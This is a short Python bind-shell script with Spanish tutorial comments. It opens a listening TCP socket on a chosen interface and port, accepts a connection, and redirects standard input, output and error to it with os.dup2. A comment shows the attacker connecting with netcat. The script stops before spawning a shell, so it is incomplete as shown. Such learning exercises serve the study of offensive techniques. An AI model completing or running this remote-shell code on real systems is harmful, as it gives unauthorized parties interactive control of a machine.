import select 
import socket 
import sys , os
from subprocess import Popen, PIPE 



# Primero voy a crear un BIND shell que es la que creo la coneccion con el puerto que este a la escucha, para conectarnos a ese socket
# Lo que vamos a crear con python es la posibilidad d conectar con la shel 
# CUnado hacemos un NETCAT lo que consigue en un socket que se lo ofrece linux
# CUnado nos solicite un shell se la damos y NETVAT se encarga de econtrar.

if len(sys.argv) != 3: 
    print("[-] usage: bindShell.py <interface> <port>") 
    exit() 
host  = sys.argv[1] 
port = int(sys.argv[2]) 
size = 1024 



# Creamos un scoket con lo parametros que ya hemos visto antes

# AF_NET ---- Address Famili IPV4
# SOCK_STREAM ----- Capa de transporte es TCP
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 


# BIND nos deja a la escucha  y le pasamos una TUPLA con direccion IP y puerto
# EN este caso le ponemos la del ssitema 
server.bind((host,port)) 
# Escuchamos
server.listen(10) 

soc, address = server.accept()


# dup2 --- COpia descriptor de fichero
# O -- Es la entrada 
# 1 Es la salida
# 2 ---- Es el error
# Todo esto es de este proceso particular

os.dup2(soc.fileno(),0)
os.dup2(soc.fileno(),1)
os.dup2(soc.fileno(),2)


# EN la otra maquina ejecutan el comando en bash -----------nc ipMLinux 9000 (ip de la maquina )
# NOs ponemos a escuchar 